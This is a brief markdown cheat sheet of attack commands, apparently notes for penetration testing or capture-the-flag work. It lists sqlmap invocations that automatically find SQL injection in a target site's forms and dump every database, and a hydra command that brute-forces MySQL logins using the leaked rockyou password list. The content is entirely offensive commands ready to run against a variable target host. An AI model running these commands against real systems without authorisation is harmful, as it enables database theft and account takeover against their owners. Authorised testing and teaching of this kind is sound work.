# linux attacker

## check and dump information from sql injection

```bash
sqlmap --batch -a --forms -u "http://$rhost" --output-dir="."
sqlmap --batch -a --dump-all --forms -u "http://$rhost" --output-dir="."
```

## bruteforce sql

```bash
hydra -L users.txt -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt $rhost mysql
```
